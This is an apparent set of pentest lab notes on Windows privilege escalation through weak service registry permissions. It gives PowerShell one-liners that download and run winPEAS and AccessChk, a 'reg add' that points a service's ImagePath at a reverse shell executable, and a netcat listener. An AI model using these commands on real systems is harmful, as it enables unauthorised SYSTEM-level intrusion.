<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Weak Registry Permissions</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Weak Registry Permissions</h1><br/><br /><strong><h3>Weak Registry Permissions</h3></strong><br />• The Windows registry stores entries for each service.<br />• Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.<br /><br />1. Check for service misconfigurations:<br />   ◇ WinPEAS generally check for service misconfigurations:  <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />      <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe quiet servicesinfo&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\winPEASany.exe&quot;</span>;</pre></div> <br />      <a href=""><img src="images/1324-1.png" alt="images/1324-1.png" /></a><br />2. Confirm the found service with:<br />   ◇ Get-Acl <br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">Get-Acl</span> HKLM<span style="color:#ff9d00;font-weight:700">:\</span>System<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Services<span style="color:#ff9d00;font-weight:700">\</span>regsvc | <span style="color:#ff9d00;font-weight:700">Format-List</span></pre></div><br />       <a href=""><img src="images/1324-2.png" alt="images/1324-2.png" /></a><br />   ◇ AccessChk(old version for command line): <a href="https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%22,%20%22$env:userprofile/desktop/Accesschk.zip">https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%22,%20%22$env:userprofile/desktop/Accesschk.zip</a><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Eula.txt&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;</pre></div><br />    <a href=""><img src="images/1324-3.png" alt="images/1324-3.png" /></a><br />    NT AUTHORITY\INTERACTIVE group has full control over the registry entry “regsvc”. This is a sudo group that comprise all the users who can login into the system locally.<br />3. Check if we can STOP/START the service<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -ucqv $env:username regsvc&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Eula.txt&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;</pre></div><br />    <a href=""><img src="images/1324-4.png" alt="images/1324-4.png" /></a><br />4. Check current value of the register entry<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg query HKLM<span style="color:#ff9d00;font-weight:700">\</span>SYSTEM<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>services<span style="color:#ff9d00;font-weight:700">\</span>regsvc</pre></div><br />    <a href=""><img src="images/1324-5.png" alt="images/1324-5.png" /></a><br />    Run with SYSTEM privileges!<br />6. Overwrite the ImagePath registry key to point to our reverse shell executable:<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg add HKLM<span style="color:#ff9d00;font-weight:700">\</span>SYSTEM<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>services<span style="color:#ff9d00;font-weight:700">\</span>regsvc <span style="color:#ff9d00;font-weight:700">/</span>v ImagePath <span style="color:#ff9d00;font-weight:700">/</span>t REG_EXPAND_SZ <span style="color:#ff9d00;font-weight:700">/</span>d C<span style="color:#ff9d00;font-weight:700">:\</span>PrivEsc<span style="color:#ff9d00;font-weight:700">\</span>reverse.exe <span style="color:#ff9d00;font-weight:700">/</span>f</pre></div><br />    <a href=""><img src="images/1324-6.png" alt="images/1324-6.png" /></a><br />7. Start a listener on Kali:<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br />    <br />8. Start the service to trigger the exploit:    <br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> net start &lt;service&gt;</pre></div><br />  <br />  <a href=""><img src="images/1324-7.png" alt="images/1324-7.png" /></a><br />  <br />  <br />  <br />Bibliography:  <br />• <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-modify-permissions">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-modify-permissions</a><br /></div>
</body>
</html>
